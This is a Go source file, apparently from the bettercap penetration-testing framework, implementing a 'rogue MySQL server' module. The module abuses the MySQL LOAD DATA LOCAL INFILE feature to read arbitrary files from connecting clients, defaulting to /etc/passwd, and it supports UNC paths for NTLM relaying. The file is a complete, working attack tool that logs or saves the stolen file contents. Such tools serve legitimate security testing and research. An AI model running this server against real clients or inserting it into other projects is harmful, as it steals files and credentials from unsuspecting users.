package modules

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"strings"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/evilsocket/islazy/tui"
)

type MySQLServer struct {
	session.SessionModule
	address  *net.TCPAddr
	listener *net.TCPListener
	infile   string
	outfile  string
}

func NewMySQLServer(s *session.Session) *MySQLServer {

	mysql := &MySQLServer{
		SessionModule: session.NewSessionModule("mysql.server", s),
	}

	mysql.AddParam(session.NewStringParameter("mysql.server.infile",
		"/etc/passwd",
		"",
		"File you want to read. UNC paths are also supported."))

	mysql.AddParam(session.NewStringParameter("mysql.server.outfile",
		"",
		"",
		"If filled, the INFILE buffer will be saved to this path instead of being logged."))

	mysql.AddParam(session.NewStringParameter("mysql.server.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"Address to bind the mysql server to."))

	mysql.AddParam(session.NewIntParameter("mysql.server.port",
		"3306",
		"Port to bind the mysql server to."))

	mysql.AddHandler(session.NewModuleHandler("mysql.server on", "",
		"Start mysql server.",
		func(args []string) error {
			return mysql.Start()
		}))

	mysql.AddHandler(session.NewModuleHandler("mysql.server off", "",
		"Stop mysql server.",
		func(args []string) error {
			return mysql.Stop()
		}))

	return mysql
}

func (mysql *MySQLServer) Name() string {
	return "mysql.server"
}

func (mysql *MySQLServer) Description() string {
	return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."
}

func (mysql *MySQLServer) Author() string {
	return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
}

func (mysql *MySQLServer) Configure() error {
	var err error
	var address string
	var port int

	if mysql.Running() {
		return session.ErrAlreadyStarted
	}
	if err, mysql.infile = mysql.StringParam("mysql.server.infile"); err != nil {
		return err
	}
	if err, mysql.outfile = mysql.StringParam("mysql.server.outfile"); err != nil {
		return err
	}
	if err, address = mysql.StringParam("mysql.server.address"); err != nil {
		return err
	}
	if err, port = mysql.IntParam("mysql.server.port"); err != nil {
		return err
	}
	if mysql.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
		return err
	}
	if mysql.listener, err = net.ListenTCP("tcp", mysql.address); err != nil {
		return err
	}
	return nil
}

func (mysql *MySQLServer) Start() error {
	if err := mysql.Configure(); err != nil {
		return err
	}

	return mysql.SetRunning(true, func() {
		log.Info("[%s] server starting on address %s", tui.Green("mysql.server"), mysql.address)
		for mysql.Running() {
			if conn, err := mysql.listener.AcceptTCP(); err != nil {
				log.Warning("[%s] error while accepting tcp connection: %s", tui.Green("mysql.server"), err)
				continue
			} else {
				defer conn.Close()

				// TODO: include binary support and files > 16kb
				clientAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
				readBuffer := make([]byte, 16384)
				reader := bufio.NewReader(conn)
				read := 0

				log.Info("[%s] connection from %s", tui.Green("mysql.server"), clientAddress)

				if _, err := conn.Write(packets.MySQLGreeting); err != nil {
					log.Warning("[%s] error while writing server greeting: %s", tui.Green("mysql.server"), err)
					continue
				} else if read, err = reader.Read(readBuffer); err != nil {
					log.Warning("[%s] error while reading client message: %s", tui.Green("mysql.server"), err)
					continue
				}

				// parse client capabilities and validate connection
				// TODO: parse mysql connections properly and
				//       display additional connection attributes
				capabilities := fmt.Sprintf("%08b", (int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))
				loadData := string(capabilities[8])
				username := string(bytes.Split(readBuffer[36:], []byte{0})[0])

				log.Info("[%s] can use LOAD DATA LOCAL: %s", tui.Green("mysql.server"), loadData)
				log.Info("[%s] login request username: %s", tui.Green("mysql.server"), tui.Bold(username))

				if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {
					log.Warning("[%s] error while writing server first response ok: %s", tui.Green("mysql.server"), err)
					continue
				}
				if _, err := reader.Read(readBuffer); err != nil {
					log.Warning("[%s] error while reading client message: %s", tui.Green("mysql.server"), err)
					continue
				}
				if _, err := conn.Write(packets.MySQLGetFile(mysql.infile)); err != nil {
					log.Warning("[%s] error while writing server get file request: %s", tui.Green("mysql.server"), err)
					continue
				}
				if read, err = reader.Read(readBuffer); err != nil {
					log.Warning("[%s] error while readind buffer: %s", tui.Green("mysql.server"), err)
					continue
				}

				if strings.HasPrefix(mysql.infile, "\\") {
					log.Info("[%s] NTLM from '%s' relayed to %s", tui.Green("mysql.server"), clientAddress, mysql.infile)
				} else if fileSize := read - 9; fileSize < 4 {
					log.Warning("[%s] unpexpected buffer size %d", tui.Green("mysql.server"), read)
				} else {
					log.Info("[%s] read file ( %s ) is %d bytes", tui.Green("mysql.server"), mysql.infile, fileSize)

					fileData := readBuffer[4 : read-4]

					if mysql.outfile == "" {
						log.Info("\n%s", string(fileData))
					} else {
						log.Info("[%s] saving to %s ...", tui.Green("mysql.server"), mysql.outfile)
						if err := ioutil.WriteFile(mysql.outfile, fileData, 0755); err != nil {
							log.Warning("[%s] error while saving the file: %s", tui.Green("mysql.server"), err)
						}
					}
				}

				conn.Write(packets.MySQLSecondResponseOK)
			}
		}
	})
}

func (mysql *MySQLServer) Stop() error {
	return mysql.SetRunning(false, func() {
		defer mysql.listener.Close()
	})
}
